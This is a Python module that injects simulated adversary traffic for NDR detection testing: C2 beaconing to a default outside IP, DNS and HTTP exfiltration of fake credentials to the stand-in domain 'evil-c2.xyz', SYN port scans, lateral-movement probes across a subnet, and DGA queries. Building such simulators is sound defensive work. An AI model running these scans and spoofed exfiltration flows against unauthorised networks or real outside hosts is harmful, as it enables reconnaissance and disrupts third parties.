"""
NetRunner OS - Adversary Traffic Simulations
Generates realistic attack traffic for NDR detection testing.
Crafts full TCP sessions (handshake + data + teardown) so NDR tools
can reconstruct and inspect application-layer content.
"""

import os
import time
import random
import string
import hashlib
import struct
from scapy.all import (
    Ether, IP, TCP, UDP, ICMP, Raw, DNS, DNSQR,
    sendp, get_if_hwaddr, RandShort
)
from app.core.engine import active_task_status, log_message


def generate(params):
    """Dispatch to the appropriate adversary simulation."""
    sim = params.get('simulation', 'c2_beacon').lower()
    simulations = {
        'c2_beacon': _sim_c2_beacon,
        'dns_exfil': _sim_dns_exfil,
        'port_scan': _sim_port_scan,
        'lateral_movement': _sim_lateral_movement,
        'http_exfil': _sim_http_exfil,
        'dga': _sim_dga,
    }

    sim_func = simulations.get(sim)
    if not sim_func:
        log_message(f"[!] Unknown simulation: {sim}")
        active_task_status['is_running'] = False
        return

    try:
        log_message(f"[*] Starting adversary simulation: {sim}")
        sim_func(params)
    except Exception as e:
        log_message(f"[!!!] Simulation error: {e}")
        active_task_status['error'] = str(e)
    finally:
        active_task_status['is_running'] = False
        active_task_status['packets_per_second'] = 0
        log_message(f"[+] {sim} simulation finished.")


def _base_packet(params):
    iface = params['interface']
    src_mac = params.get('src_mac') or get_if_hwaddr(iface)
    dst_mac = params.get('dst_mac', 'ff:ff:ff:ff:ff:ff')
    return Ether(src=src_mac, dst=dst_mac)


def _send_with_tracking(packets, params, delay_override=None):
    iface = params['interface']
    delay = delay_override if delay_override is not None else params.get('delay', 1.0)
    total = len(packets)
    active_task_status['total'] = total

    pps_start = time.time()
    pps_count = 0

    for i, pkt in enumerate(packets):
        if not active_task_status['is_running']:
            log_message("[!] Stop signal received.")
            break

        sendp(pkt, iface=iface, verbose=0)
        active_task_status['progress'] = i + 1
        active_task_status['message'] = f"Sending packet {i+1}/{total}"

        pps_count += 1
        if time.time() - pps_start >= 1.0:
            active_task_status['packets_per_second'] = pps_count
            pps_count = 0
            pps_start = time.time()

        if delay > 0:
            time.sleep(delay)


# ── TCP Session Helpers ─────────────────────────────────────────────────────

def _tcp_handshake(base, src_ip, dst_ip, sport, dport):
    """
    Craft a full TCP 3-way handshake (SYN, SYN-ACK, ACK).
    Both client and server packets are injected onto the wire so the NDR
    can reconstruct the session.
    Returns (packets, client_seq, server_seq) for use in subsequent data packets.
    """
    seq_client = random.randint(1000000, 4294900000)
    seq_server = random.randint(1000000, 4294900000)

    packets = []

    # Client SYN
    packets.append(
        base / IP(src=src_ip, dst=dst_ip) /
        TCP(sport=sport, dport=dport, flags='S',
            seq=seq_client, window=64240,
            options=[('MSS', 1460), ('SAckOK', b''), ('WScale', 7)])
    )

    # Server SYN-ACK
    packets.append(
        base / IP(src=dst_ip, dst=src_ip) /
        TCP(sport=dport, dport=sport, flags='SA',
            seq=seq_server, ack=seq_client + 1,
            window=65535,
            options=[('MSS', 1460), ('SAckOK', b''), ('WScale', 7)])
    )

    # Client ACK (completes handshake)
    packets.append(
        base / IP(src=src_ip, dst=dst_ip) /
        TCP(sport=sport, dport=dport, flags='A',
            seq=seq_client + 1, ack=seq_server + 1,
            window=64240)
    )

    return packets, seq_client + 1, seq_server + 1


def _tcp_fin(base, src_ip, dst_ip, sport, dport, seq, ack):
    """Craft a TCP FIN teardown sequence."""
    packets = []

    # Client FIN-ACK
    packets.append(
        base / IP(src=src_ip, dst=dst_ip) /
        TCP(sport=sport, dport=dport, flags='FA', seq=seq, ack=ack)
    )

    # Server FIN-ACK
    packets.append(
        base / IP(src=dst_ip, dst=src_ip) /
        TCP(sport=dport, dport=sport, flags='FA', seq=ack, ack=seq + 1)
    )

    # Client final ACK
    packets.append(
        base / IP(src=src_ip, dst=dst_ip) /
        TCP(sport=sport, dport=dport, flags='A', seq=seq + 1, ack=ack + 1)
    )

    return packets


def _build_tls_client_hello(hostname=''):
    """
    Build a realistic TLS 1.2 ClientHello record.
    Includes SNI extension, supported cipher suites, and random bytes
    so the NDR can parse the TLS layer and extract the SNI.
    """
    # Random bytes (32 bytes)
    client_random = os.urandom(32)

    # Session ID (32 bytes)
    session_id = os.urandom(32)

    # Cipher suites (common TLS 1.2 suites)
    cipher_suites = struct.pack('!H', 20) + struct.pack(
        '!10H',
        0xc02c,  # TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384
        0xc02b,  # TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256
        0xc030,  # TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384
        0xc02f,  # TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256
        0x009e,  # TLS_DHE_RSA_WITH_AES_256_GCM_SHA384
        0x009c,  # TLS_RSA_WITH_AES_128_GCM_SHA256
        0x002f,  # TLS_RSA_WITH_AES_128_CBC_SHA
        0x0035,  # TLS_RSA_WITH_AES_256_CBC_SHA
        0x000a,  # TLS_RSA_WITH_3DES_EDE_CBC_SHA
        0x00ff,  # TLS_EMPTY_RENEGOTIATION_INFO_SCSV
    )

    # Compression methods
    compression = b'\x01\x00'  # 1 method: null

    # Extensions
    extensions = b''

    # SNI extension (type 0x0000)
    if hostname:
        host_bytes = hostname.encode()
        sni_list = struct.pack('!BH', 0, len(host_bytes)) + host_bytes
        sni_data = struct.pack('!H', len(sni_list)) + sni_list
        extensions += struct.pack('!HH', 0x0000, len(sni_data)) + sni_data

    # Supported groups extension (type 0x000a)
    groups_data = struct.pack('!H', 6) + struct.pack('!3H', 0x001d, 0x0017, 0x0018)
    extensions += struct.pack('!HH', 0x000a, len(groups_data)) + groups_data

    # Signature algorithms extension (type 0x000d)
    sig_algs = struct.pack('!H', 8) + struct.pack('!4H', 0x0401, 0x0501, 0x0601, 0x0201)
    extensions += struct.pack('!HH', 0x000d, len(sig_algs)) + sig_algs

    extensions_data = struct.pack('!H', len(extensions)) + extensions

    # ClientHello body
    client_hello_body = (
        b'\x03\x03' +                              # TLS 1.2
        client_random +                             # 32 bytes random
        struct.pack('!B', 32) + session_id +        # session ID
        cipher_suites +                             # cipher suites
        compression +                               # compression
        extensions_data                             # extensions
    )

    # Handshake header (type=ClientHello=1)
    handshake = b'\x01' + struct.pack('!I', len(client_hello_body))[1:] + client_hello_body

    # TLS record header (type=Handshake=0x16, version=TLS1.0=0x0301)
    record = b'\x16\x03\x01' + struct.pack('!H', len(handshake)) + handshake

    return record


# ── C2 Beaconing ─────────────────────────────────────────────────────────────

def _sim_c2_beacon(params):
    """
    C2 beaconing: periodic HTTPS callbacks with full TCP sessions.
    Crafts complete TCP handshakes, TLS ClientHello with SNI, server
    responses, and connection teardown for each beacon cycle.
    """
    c2_host = params.get('c2_host', '185.100.87.42')
    count = params.get('count', 50)
    src_ip = params['src_ip']
    base = _base_packet(params)

    log_message(f"    C2 Server: {c2_host}")
    log_message(f"    Beacon count: {count}")

    packets = []
    for i in range(count):
        sport = random.randint(49152, 65535)

        # TCP 3-way handshake
        hs_pkts, client_seq, server_seq = _tcp_handshake(
            base, src_ip, c2_host, sport, 443
        )
        packets.extend(hs_pkts)

        # TLS ClientHello with SNI
        tls_hello = _build_tls_client_hello(hostname=c2_host)
        packets.append(
            base / IP(src=src_ip, dst=c2_host) /
            TCP(sport=sport, dport=443, flags='PA',
                seq=client_seq, ack=server_seq) /
            Raw(load=tls_hello)
        )
        client_seq += len(tls_hello)

        # Server ACK
        packets.append(
            base / IP(src=c2_host, dst=src_ip) /
            TCP(sport=443, dport=sport, flags='A',
                seq=server_seq, ack=client_seq)
        )

        # Server TLS ServerHello + Certificate (simulated response)
        server_hello = b'\x16\x03\x03' + struct.pack('!H', 74)
        server_hello += b'\x02' + b'\x00\x00\x46'  # ServerHello handshake
        server_hello += b'\x03\x03'                 # TLS 1.2
        server_hello += os.urandom(32)              # server random
        server_hello += b'\x20' + os.urandom(32)    # session ID
        server_hello += struct.pack('!H', 0xc02f)   # cipher suite
        server_hello += b'\x00'                     # compression null
        packets.append(
            base / IP(src=c2_host, dst=src_ip) /
            TCP(sport=443, dport=sport, flags='PA',
                seq=server_seq, ack=client_seq) /
            Raw(load=server_hello)
        )
        server_seq += len(server_hello)

        # Client ACK
        packets.append(
            base / IP(src=src_ip, dst=c2_host) /
            TCP(sport=sport, dport=443, flags='A',
                seq=client_seq, ack=server_seq)
        )

        # Encrypted application data (beacon payload)
        beacon_data = b'\x17\x03\x03' + struct.pack('!H', random.randint(64, 256))
        beacon_data += os.urandom(random.randint(64, 256))
        packets.append(
            base / IP(src=src_ip, dst=c2_host) /
            TCP(sport=sport, dport=443, flags='PA',
                seq=client_seq, ack=server_seq) /
            Raw(load=beacon_data)
        )
        client_seq += len(beacon_data)

        # Server beacon response
        resp_data = b'\x17\x03\x03' + struct.pack('!H', random.randint(32, 128))
        resp_data += os.urandom(random.randint(32, 128))
        packets.append(
            base / IP(src=c2_host, dst=src_ip) /
            TCP(sport=443, dport=sport, flags='PA',
                seq=server_seq, ack=client_seq) /
            Raw(load=resp_data)
        )
        server_seq += len(resp_data)

        # Client ACK
        packets.append(
            base / IP(src=src_ip, dst=c2_host) /
            TCP(sport=sport, dport=443, flags='A',
                seq=client_seq, ack=server_seq)
        )

        # TCP FIN teardown
        fin_pkts = _tcp_fin(base, src_ip, c2_host, sport, 443,
                            client_seq, server_seq)
        packets.extend(fin_pkts)

    _send_with_tracking(packets, params, delay_override=None)


# ── DNS Exfiltration ─────────────────────────────────────────────────────────

def _sim_dns_exfil(params):
    """Data exfiltration over DNS using encoded subdomains."""
    domain = params.get('domain', 'evil-c2.xyz')
    count = params.get('count', 30)
    src_ip = params['src_ip']
    dst_ip = params['dst_ip']
    base = _base_packet(params)

    log_message(f"    Exfil domain: {domain}")
    log_message(f"    Encoding fake data into DNS queries")

    fake_data = "CONFIDENTIAL:username=admin;password=P@ssw0rd;ssn=123-45-6789;cc=4111111111111111"
    chunks = [fake_data[i:i+30] for i in range(0, len(fake_data), 30)]

    packets = []
    for i in range(count):
        chunk = chunks[i % len(chunks)]
        encoded = chunk.encode().hex()
        query_name = f"{encoded}.{i}.data.{domain}"

        pkt = (base / IP(src=src_ip, dst=dst_ip) /
               UDP(sport=RandShort(), dport=53) /
               DNS(rd=1, qd=DNSQR(qname=query_name, qtype="TXT")))
        packets.append(pkt)
        log_message(f"    DNS Exfil query: {query_name[:60]}...")

    _send_with_tracking(packets, params, delay_override=0.2)


# ── Port Scanning ────────────────────────────────────────────────────────────

def _sim_port_scan(params):
    """SYN port scan across common ports."""
    src_ip = params['src_ip']
    dst_ip = params['dst_ip']
    base = _base_packet(params)

    common_ports = [
        21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445,
        993, 995, 1433, 1521, 3306, 3389, 5432, 5900, 8080, 8443, 8888
    ]

    log_message(f"    Target: {dst_ip}")
    log_message(f"    Scanning {len(common_ports)} common ports")

    packets = []
    sport = random.randint(40000, 60000)
    for port in common_ports:
        pkt = base / IP(src=src_ip, dst=dst_ip) / TCP(sport=sport, dport=port, flags='S')
        packets.append(pkt)
        sport += 1

    _send_with_tracking(packets, params, delay_override=0.05)


# ── Lateral Movement ─────────────────────────────────────────────────────────

def _sim_lateral_movement(params):
    """
    Lateral movement: SMB/WinRM/RDP/SSH attempts across a /24 subnet.
    Includes full TCP handshakes and protocol-specific payloads so the
    NDR sees actual service interaction, not just SYN packets.
    """
    src_ip = params['src_ip']
    dst_ip = params['dst_ip']
    base = _base_packet(params)

    octets = dst_ip.split('.')
    subnet_prefix = '.'.join(octets[:3])

    lateral_ports = {
        445: "SMB",
        5985: "WinRM",
        3389: "RDP",
        135: "RPC",
        22: "SSH"
    }

    log_message(f"    Source: {src_ip}")
    log_message(f"    Target subnet: {subnet_prefix}.0/24")
    log_message(f"    Protocols: {', '.join(lateral_ports.values())}")

    packets = []
    targets = random.sample(range(1, 255), min(20, 254))
    for host in targets:
        target = f"{subnet_prefix}.{host}"
        for port, proto_name in lateral_ports.items():
            sport = random.randint(49152, 65535)

            # TCP 3-way handshake
            hs_pkts, client_seq, server_seq = _tcp_handshake(
                base, src_ip, target, sport, port
            )
            packets.extend(hs_pkts)

            # Protocol-specific payloads after handshake
            if port == 445:
                # SMB2 Negotiate Protocol Request
                smb_header = b'\x00\x00\x00\x72'     # NetBIOS session header
                smb_header += b'\xfeSMB'              # SMB2 magic
                smb_header += struct.pack('<H', 64)   # header length
                smb_header += struct.pack('<H', 0)    # credit charge
                smb_header += struct.pack('<I', 0)    # status
                smb_header += struct.pack('<H', 0)    # negotiate command
                smb_header += struct.pack('<H', 1)    # credits requested
                smb_header += struct.pack('<I', 0)    # flags
                smb_header += struct.pack('<I', 0)    # next command
                smb_header += struct.pack('<Q', 1)    # message ID
                smb_header += struct.pack('<I', 0)    # reserved
                smb_header += struct.pack('<I', 0)    # tree ID
                smb_header += struct.pack('<Q', 0)    # session ID
                smb_header += b'\x00' * 16            # signature
                # Negotiate body
                smb_header += struct.pack('<H', 36)   # struct size
                smb_header += struct.pack('<H', 2)    # dialect count
                smb_header += struct.pack('<H', 1)    # signing required
                smb_header += b'\x00' * 2             # reserved
                smb_header += struct.pack('<I', 0x7f) # capabilities
                smb_header += b'\x00' * 16            # client GUID
                smb_header += struct.pack('<I', 0)    # negotiate context offset
                smb_header += struct.pack('<H', 0)    # negotiate context count
                smb_header += b'\x00' * 2             # reserved
                smb_header += struct.pack('<H', 0x0202)  # SMB 2.0.2
                smb_header += struct.pack('<H', 0x0210)  # SMB 2.1

                packets.append(
                    base / IP(src=src_ip, dst=target) /
                    TCP(sport=sport, dport=port, flags='PA',
                        seq=client_seq, ack=server_seq) /
                    Raw(load=smb_header)
                )
                client_seq += len(smb_header)

            elif port == 22:
                # SSH version banner
                ssh_banner = b'SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.6\r\n'
                packets.append(
                    base / IP(src=src_ip, dst=target) /
                    TCP(sport=sport, dport=port, flags='PA',
                        seq=client_seq, ack=server_seq) /
                    Raw(load=ssh_banner)
                )
                client_seq += len(ssh_banner)

                # Server SSH banner response
                server_banner = b'SSH-2.0-OpenSSH_9.3\r\n'
                packets.append(
                    base / IP(src=target, dst=src_ip) /
                    TCP(sport=port, dport=sport, flags='PA',
                        seq=server_seq, ack=client_seq) /
                    Raw(load=server_banner)
                )
                server_seq += len(server_banner)

            elif port == 3389:
                # RDP X.224 Connection Request
                x224_cr = (
                    b'\x03\x00'                       # TPKT header
                    b'\x00\x2b'                       # length
                    b'\x26'                           # X.224 length
                    b'\xe0'                           # CR TPDU
                    b'\x00\x00'                       # dst ref
                    b'\x00\x00'                       # src ref
                    b'\x00'                           # class 0
                    b'Cookie: mstshash=admin\r\n'     # RDP cookie with username
                    b'\x01\x00\x08\x00\x03\x00\x00\x00'  # RDP negotiation request
                )
                packets.append(
                    base / IP(src=src_ip, dst=target) /
                    TCP(sport=sport, dport=port, flags='PA',
                        seq=client_seq, ack=server_seq) /
                    Raw(load=x224_cr)
                )
                client_seq += len(x224_cr)

            elif port == 5985:
                # WinRM HTTP POST
                winrm_post = (
                    f"POST /wsman HTTP/1.1\r\n"
                    f"Host: {target}:5985\r\n"
                    f"Content-Type: application/soap+xml;charset=UTF-8\r\n"
                    f"User-Agent: Microsoft WinRM Client\r\n"
                    f"Content-Length: 0\r\n"
                    f"Authorization: Negotiate TlRMTVNTUAABAAAA\r\n\r\n"
                ).encode()
                packets.append(
                    base / IP(src=src_ip, dst=target) /
                    TCP(sport=sport, dport=port, flags='PA',
                        seq=client_seq, ack=server_seq) /
                    Raw(load=winrm_post)
                )
                client_seq += len(winrm_post)

            # Server RST to simulate rejected/failed connection
            packets.append(
                base / IP(src=target, dst=src_ip) /
                TCP(sport=port, dport=sport, flags='RA',
                    seq=server_seq, ack=client_seq)
            )

        if not active_task_status['is_running']:
            break

    log_message(f"    Total connection attempts: {len(packets)}")
    _send_with_tracking(packets, params, delay_override=0.02)


# ── HTTP Data Exfiltration ───────────────────────────────────────────────────

def _sim_http_exfil(params):
    """
    Data exfiltration via large HTTP POST requests with full TCP sessions.
    The NDR will see complete HTTP sessions with large outbound payloads.
    """
    c2_host = params.get('c2_host', '185.100.87.42')
    count = params.get('count', 10)
    src_ip = params['src_ip']
    base = _base_packet(params)

    log_message(f"    Exfil target: {c2_host}")
    log_message(f"    Sending {count} large POST requests")

    packets = []
    for i in range(count):
        fake_data = ''.join(random.choices(
            string.ascii_letters + string.digits,
            k=random.randint(1000, 4000)
        ))
        sport = random.randint(49152, 65535)

        # TCP handshake
        hs_pkts, client_seq, server_seq = _tcp_handshake(
            base, src_ip, c2_host, sport, 80
        )
        packets.extend(hs_pkts)

        # HTTP POST with exfil data
        http_post = (
            f"POST /upload/data_{i} HTTP/1.1\r\n"
            f"Host: {c2_host}\r\n"
            f"Content-Type: application/octet-stream\r\n"
            f"Content-Length: {len(fake_data)}\r\n"
            f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n"
            f"X-Session: {hashlib.md5(str(i).encode()).hexdigest()}\r\n"
            f"Connection: close\r\n\r\n"
            f"{fake_data}"
        ).encode()

        packets.append(
            base / IP(src=src_ip, dst=c2_host) /
            TCP(sport=sport, dport=80, flags='PA',
                seq=client_seq, ack=server_seq) /
            Raw(load=http_post)
        )
        client_seq += len(http_post)

        # Server ACK
        packets.append(
            base / IP(src=c2_host, dst=src_ip) /
            TCP(sport=80, dport=sport, flags='A',
                seq=server_seq, ack=client_seq)
        )

        # Server HTTP 200 OK response
        http_resp = (
            b"HTTP/1.1 200 OK\r\n"
            b"Content-Type: text/plain\r\n"
            b"Content-Length: 2\r\n"
            b"Connection: close\r\n\r\n"
            b"OK"
        )
        packets.append(
            base / IP(src=c2_host, dst=src_ip) /
            TCP(sport=80, dport=sport, flags='PA',
                seq=server_seq, ack=client_seq) /
            Raw(load=http_resp)
        )
        server_seq += len(http_resp)

        # Client ACK
        packets.append(
            base / IP(src=src_ip, dst=c2_host) /
            TCP(sport=sport, dport=80, flags='A',
                seq=client_seq, ack=server_seq)
        )

        # TCP FIN teardown
        fin_pkts = _tcp_fin(base, src_ip, c2_host, sport, 80,
                            client_seq, server_seq)
        packets.extend(fin_pkts)

        log_message(f"    Exfil POST #{i+1}: {len(fake_data)} bytes")

    _send_with_tracking(packets, params, delay_override=0.5)


# ── DGA Traffic ──────────────────────────────────────────────────────────────

def _sim_dga(params):
    """Domain Generation Algorithm traffic."""
    count = params.get('count', 50)
    src_ip = params['src_ip']
    dst_ip = params['dst_ip']
    base = _base_packet(params)

    tlds = ['.xyz', '.top', '.club', '.info', '.online', '.site', '.tk', '.pw']

    log_message(f"    Generating {count} DGA domains")

    packets = []
    seed = int(time.time())
    for i in range(count):
        h = hashlib.md5(f"{seed}_{i}".encode()).hexdigest()
        domain_len = random.randint(8, 16)
        dga_domain = h[:domain_len] + random.choice(tlds)

        pkt = (base / IP(src=src_ip, dst=dst_ip) /
               UDP(sport=RandShort(), dport=53) /
               DNS(rd=1, qd=DNSQR(qname=dga_domain)))
        packets.append(pkt)
        log_message(f"    DGA query: {dga_domain}")

    _send_with_tracking(packets, params, delay_override=0.1)
